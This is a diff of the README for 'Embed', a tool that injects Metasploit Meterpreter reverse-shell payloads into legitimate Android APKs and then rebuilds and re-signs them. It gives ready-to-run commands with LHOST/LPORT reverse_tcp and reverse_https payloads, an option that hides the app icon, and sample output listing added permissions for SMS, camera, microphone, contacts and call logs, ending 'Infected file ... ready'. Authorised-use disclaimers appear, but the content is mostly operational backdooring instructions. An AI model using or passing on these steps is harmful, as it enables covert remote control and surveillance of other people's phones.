@@ -1,124 +1,216 @@
-# EMBED v.3.0
-This tool creates a payload with metasploit framework and injected into a legitimate APK.
+# Embed
 
-### IA ASSISTANT
-[![Ask DeepWiki](https://deepwiki.com/badge.svg)](https://deepwiki.com/ivam3/embed)
+> Inject a Metasploit payload into a legitimate Android APK.
 
-Join to [deepwiki](https://deepwiki.com/ivam3/embed) and learn more about this project asking to our IA assistant trained with all the information about this project and its tools.
+Embed is a Ruby-based Android backdooring tool. It generates a Metasploit
+payload with `msfvenom`, decompiles the target APK, injects the payload into the
+launcher activity, adds the payload permissions to the manifest, rebuilds the
+APK, signs it and aligns it.
 
-	DISCLAIMER
-If the law is violated with it's use, this would be the responsibility of the user who handled it..
-Ivam3 is not responsible for the misuse that can be given to everything that this laboratory entails
+Use Embed only against applications you own or have explicit written permission
+to test. Distributing modified APKs or using them to access other people's
+devices is illegal in most jurisdictions.
 
-# REQUIREMENTS.
-- Metasploit
-- Java
-- Keytool
-- Apktool
-- Jarsigner
-- Apksigner
-- Aapt
+## Features
 
-# INSTALLATION.
-- Linux OS:
+- Generates Android Meterpreter payloads with `msfvenom`.
+- Merges payload permissions into the original manifest.
+- Injects the payload into the launcher activity or a selected `onCreate()` hook.
+- Supports three signing workflows: the Android debug key, an existing keystore
+  or a newly generated keystore.
+- Rebuilds, signs and aligns the final APK.
+- Includes a Termux package and a manual Linux setup script.
+
+## Requirements
+
+| Component | Purpose |
+|---|---|
+| Ruby 3.x | Runs `embed.rb`. |
+| Bundler and gems | `nokogiri` and `activesupport`. |
+| Metasploit Framework | Provides `msfvenom`. |
+| OpenJDK 21 | Runs Apktool and the signing tools. |
+| Apktool | Decompiles and rebuilds APKs. |
+| `aapt` | Reads the launcher activity and manifest metadata. |
+| `apksigner` / `jarsigner` | Signs the rebuilt APK. |
+| `zipalign` | Aligns the final APK. |
+| `xml2axml` | Re-encodes the modified manifest when required. |
+
+## Installation
+
+### Termux package (recommended)
+
 ```bash
-apt install git -y;
-git clone https://github.com/ivam3/embed.git;
-chmod +x setup;
-bash setup manual
+pkg update
+pkg install embed
 ```
-- Android OS with Termux:
+
+The package installs the runtime and dependencies. Metasploit is suggested but
+is not installed automatically:
+
 ```bash
-apt install wget;
-mkdir -p $PREFIX/etc/apt/sources.list.d;
-wget https://raw.githubusercontent.com/ivam3/termux-packages/gh-pages/ivam3-termux-packages.list -O $PREFIX/etc/apt/sources.list.d/ivam3-termux-packages.list;
-apt update && apt upgrade -y;
-apt install embed -y
+pkg install metasploit-framework
 ```
 
-# USAGE
-Embed v3+ come with 3 options to use a keystore signature for sign your apk files :
-- {3} To create your own keystore.
-- {2} Using your own keystore; if you have one or if you was created it before in option 3.
-- {1} Default: Using a keystore with the next parameters :
+### Manual installation on Linux
 
-```
-Enter keystore password: android
-Re-enter new password: android
-What is your first and last name?
-  [Unknown]:  Android Debugging
-What is the name of your organizational unit?
-  [Unknown]:  Android
-What is the name of your organization?
-  [Unknown]:  Android Debugging
-What is the name of your City or Locality?
-  [Unknown]:  California
-What is the name of your State or Province?
-  [Unknown]:  San Francisco
-What is the two-letter country code for this unit?
-  [Unknown]:  CA
-Is CN=Android Debugging, OU=Android, O=Android Debugging, L=California, ST=San Francisco, C=CA correct?
-  [no]:  yes
-
-Generating 2,048 bit RSA key pair and self-signed certificate (SHA256withRSA) with a validity of 10,000 days
-for: CN=Android Debugging, OU=Android, O=Android Debugging, L=California, ST=San Francisco, C=CA
-[Storing key.jks]
+```bash
+git clone https://github.com/ivam3/embed.git
+cd embed
+bash setup install
 ```
 
-# EXAMPLE OF USAGE
-``` bash
-$ embed.rb [target.apk] [msfvenom options]
-```
-```
-$ embed PATH/to/legitim.apk -p android/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4546
+The setup script installs the system dependencies, downloads Apktool, installs
+the Android debug keystore and runs Bundler. If your distribution uses another
+package manager, install the equivalent packages first:
 
-._____ __  __ ____  _____ ____
-| ____|  \/  | __ )| ____|  _ \
-|  _| | v3.0 |  _ \|  _| | | | |
-| |___| |\/| | |_) | |___| |_| |
-|_____|_|  |_|____/|_____|____/
-#:::::::: By Ivam3 ::::::::::::#
-
-[?]─➤ Set a keystore signer
- ╰{1}─➤ Default (Android Debug key)
- ╰{2}─➤ Using your own key
- ╰{3}─➤ Create a new key
- ╰────➤ 1
-[*]─➤ Generating msfvenom payload..
-[*]─➤ Signing payload..
-[*]─➤ Decompiling orignal APK..
-[*]─➤ Ignoring the resource decompilation..
-[*]─➤ Decompiling payload APK..
-[*]─➤ Locating onCreate() hook..
-[*]─➤ Copying payload files..
-[*]─➤ Loading original/smali_classes3/mx/mxlpvplayer/activities/SplashActivity.smali and injecting payload..
-[*]─➤ Poisoning the manifest with meterpreter permissions..
-[+]─➤ Adding android.permission.CHANGE_WIFI_STATE
-[+]─➤ Adding android.permission.ACCESS_COARSE_LOCATION
-[+]─➤ Adding android.permission.ACCESS_FINE_LOCATION
-[+]─➤ Adding android.permission.READ_PHONE_STATE
-[+]─➤ Adding android.permission.SEND_SMS
-[+]─➤ Adding android.permission.RECEIVE_SMS
-[+]─➤ Adding android.permission.RECORD_AUDIO
-[+]─➤ Adding android.permission.CALL_PHONE
-[+]─➤ Adding android.permission.READ_CONTACTS
-[+]─➤ Adding android.permission.WRITE_CONTACTS
-[+]─➤ Adding android.permission.WRITE_SETTINGS
-[+]─➤ Adding android.permission.CAMERA
-[+]─➤ Adding android.permission.READ_SMS
-[+]─➤ Adding android.permission.SET_WALLPAPER
-[+]─➤ Adding android.permission.READ_CALL_LOG
-[+]─➤ Adding android.permission.WRITE_CALL_LOG
-[+]─➤ Adding android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
-[*]─➤ Rebuilding /PATH/to/legitim.apk
-      with meterpreter injection as data/data/com_backdoored.apk..
-[*]─➤ Signing data/data/com_backdoored.apk ..
-[*]─➤ Aligning data/data/com_backdoored.apk ..
-[+]─➤ Infected file legitim.apk_final ready.
+```bash
+# Debian/Ubuntu example
+sudo apt install ruby ruby-dev build-essential git wget curl default-jdk \
+  android-sdk-build-tools apktool zipalign
 ```
 
-### License
+Then run the script with Bundler:
 
-GNU
+```bash
+bundle exec ruby embed.rb --help
+```
 
-##### Follow me on [Socials Network](https://wlo.link/@Ivam3)
+### Setup options
+
+| Command | Description |
+|---|---|
+| `bash setup install` | Install all dependencies and Ruby gems. |
+| `bash setup apt` | Add the i-HakLab APT repository and install `embed`. |
+| `bash setup apktool` | Download the pinned Apktool version. |
+| `bash setup keystore` | Download the Android debug keystore. |
+| `bash setup java8` | Install the legacy Java 8 runtime. |
+
+## Usage
+
+```bash
+embed <target.apk> <msfvenom options>
+```
+
+Example:
+
+```bash
+embed app.apk -p android/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444
+```
+
+For an HTTPS payload:
+
+```bash
+embed app.apk -p android/meterpreter/reverse_https LHOST=example.com LPORT=8443
+```
+
+The result is written next to the original file as:
+
+```text
+<target>_final.apk
+```
+
+### Signing options
+
+Embed asks how to sign the rebuilt APK:
+
+| Option | Description |
+|---|---|
+| `1` | Use the Android debug keystore (`~/.android/debug.keystore`). |
+| `2` | Use an existing keystore. |
+| `3` | Create a new keystore. |
+
+The default debug keystore uses the standard Android credentials:
+
+```text
+Keystore password: android
+Key alias: androiddebugkey
+Key password: android
+```
+
+Do not use the debug key for production or Play Store releases. Use option `2`
+with your own keystore for any real signing workflow.
+
+## Workflow
+
+1. `msfvenom` generates the payload APK.
+2. Apktool decompiles the original APK and the payload.
+3. Embed locates the launcher activity.
+4. The payload smali files are copied into the original APK.
+5. The payload permissions are merged into the original manifest.
+6. The APK is rebuilt, signed and aligned.
+7. The final file is written as `<target>_final.apk`.
+
+## Configuration
+
+Embed does not use a configuration file. Payload options are passed directly to
+`msfvenom` on the command line.
+
+Useful `msfvenom` options:
+
+```bash
+embed app.apk -p android/meterpreter/reverse_tcp \
+  LHOST=192.168.1.10 \
+  LPORT=4444 \
+  AndroidHideAppIcon=true \
+  AndroidWakelock=true
+```
+
+Run `msfvenom --list payloads` to see the payloads available in your Metasploit
+installation.
+
+## Troubleshooting
+
+### `msfvenom: command not found`
+
+Install Metasploit:
+
+```bash
+pkg install metasploit-framework
+```
+
+### `aapt: command not found`
+
+Install the Android build tools or the Termux package:
+
+```bash
+pkg install aapt apksigner
+```
+
+### Apktool cannot decode the target
+
+Some APKs use unsupported resources or split APK formats. Try a different
+Apktool version:
+
+```bash
+bash setup apktool
+```
+
+### The rebuilt APK is not signed
+
+Choose option `2` and provide a valid keystore, or run option `1` to create the
+debug keystore. Verify the file exists:
+
+```bash
+ls -l ~/.android/debug.keystore
+```
+
+### Injection fails in `onCreate()`
+
+The tool falls back to a manual hook selection when the launcher activity cannot
+be found automatically. Choose a smali file that contains
+`onCreate(Landroid/os/Bundle;)V`.
+
+## Legal notice
+
+Embed is a security testing tool. You are responsible for complying with the
+law, Android platform rules and the terms of any application you modify. The
+author does not accept responsibility for misuse, account bans, device damage or
+legal consequences.
+
+Report issues or request help at <https://t.me/Ivam3_Bot>.
+
+## License
+
+GNU. See [LICENSE](LICENSE).
+
+##### Follow me on [Socials Network](https://ivam3.github.io)
